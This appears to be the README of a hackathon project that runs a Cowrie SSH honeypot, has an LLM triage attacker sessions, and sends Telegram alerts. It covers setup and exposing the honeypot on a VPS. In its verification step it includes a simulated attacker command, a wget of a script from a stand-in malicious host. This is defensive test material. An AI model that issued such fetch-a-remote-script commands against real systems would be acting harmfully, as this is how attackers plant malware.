# Honai

AI honeypot with agentic SOC analysis. Cowrie catches SSH attackers on port 22,
an LLM triages each session and assigns a verdict, and Telegram fires on
anything suspicious or critical. Built in 24 hours for a hackathon.

## Architecture

```
       internet
          │
          ▼  port 22
┌──────────────────┐
│ Cowrie (Docker)  │   SSH honeypot
└────────┬─────────┘
         │ cowrie.json
         ▼
┌──────────────────┐
│ ingest/tail.py   │   parses session-end events, dedups by payload_hash
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│   sessions.db    │   SQLite (see docs/SCHEMA.md)
└────┬─────────────┘
     │
     ▼
┌──────────────────┐
│ agents/triage.py │   Groq/Llama verdict, marks row triaged
└────────┬─────────┘
         │ verdict ∈ {suspicious, critical}
         ▼
┌──────────────────┐
│ agents/notify.py │   Telegram alert, deduped via ledger
└──────────────────┘

agents/digest.py   on-demand Markdown digest → digests table + Telegram
```

The two halves communicate only through `sessions.db`. See
[docs/SCHEMA.md](docs/SCHEMA.md) for the table contract.

## Quick start

You need Docker Desktop, a [Groq API key](https://console.groq.com), and a
Telegram bot (create via [@BotFather](https://t.me/BotFather), get your chat ID
from [@userinfobot](https://t.me/userinfobot)). No local Python required.

```bash
git clone https://github.com/mpck4/HonAI.git
cd HonAI

# Bash:        cp agents/.env.example agents/.env
# PowerShell:  Copy-Item agents/.env.example agents/.env
```

Fill in `GROQ_API_KEY`, `TELEGRAM_TOKEN`, and `TELEGRAM_CHAT_ID` in
`agents/.env`. Then:

```bash
docker compose up
```

First boot builds two Python images (~30s). Subsequent starts are seconds. Each
boot archives the previous run's cowrie.json into `./archive/<UTC-timestamp>/`
and wipes `./data/sessions.db` so triage never re-spends tokens on old sessions.

## Verify

In another terminal:

```bash
ssh root@localhost     # any password works
> whoami
> wget http://evil.example/script.sh
> exit
```

Within ~10s, `docker compose logs -f triage` should show:

```
[triage] session N (172.18.0.1) → critical
```

…and your phone buzzes.

## Useful commands

```bash
docker compose logs -f cowrie     # watch attackers land
docker compose logs -f ingest     # tailer activity
docker compose logs -f triage     # LLM verdicts

docker compose exec triage python digest.py   # on-demand digest to Telegram

docker compose down               # stop everything
```

## Going public

Local-only is fine for a demo. To catch real internet traffic, the simplest
path is a cheap VPS (Hetzner, DigitalOcean, etc.) — move real sshd off port 22,
then run the container there.

```bash
# 1. Move the real sshd to another port BEFORE touching the firewall.
sudo sed -i 's/^#\?Port .*/Port 2222/' /etc/ssh/sshd_config
sudo systemctl restart ssh

# 2. From a NEW terminal, confirm you can still get in on 2222 before
#    closing your current session. If this fails, fix it via the provider
#    console — don't lock yourself out.
ssh -p 2222 user@your-vps

# 3. Open both ports.
sudo ufw allow 2222/tcp     # your real SSH
sudo ufw allow 22/tcp       # honeypot
sudo ufw enable

# 4. Clone, fill in agents/.env, run.
git clone https://github.com/mpck4/HonAI.git && cd HonAI
cp agents/.env.example agents/.env   # edit with your keys
docker compose up -d
```

Scanners usually hit within minutes. Watch `docker compose logs -f triage`.

Other options:

- **Router port-forward**: external TCP 22 → laptop LAN IP. Real traffic, no
  VPS bill. Some ISPs block 22.
- **ngrok TCP**: `ngrok tcp 22` exposes the laptop publicly. Good for demos
  to judges, won't attract organic scanner traffic.

## Testing without Cowrie

[ingest/fixtures/sample_cowrie.json](ingest/fixtures/sample_cowrie.json) has
three sessions (credential-stuffer, malware downloader, dedup duplicate). With
local Python 3.10+:

```bash
python -m ingest.tail --cowrie-log ingest/fixtures/sample_cowrie.json --once
```

Expected: `+2 inserted, +1 deduped`.

## License

MIT — see [LICENSE](LICENSE).
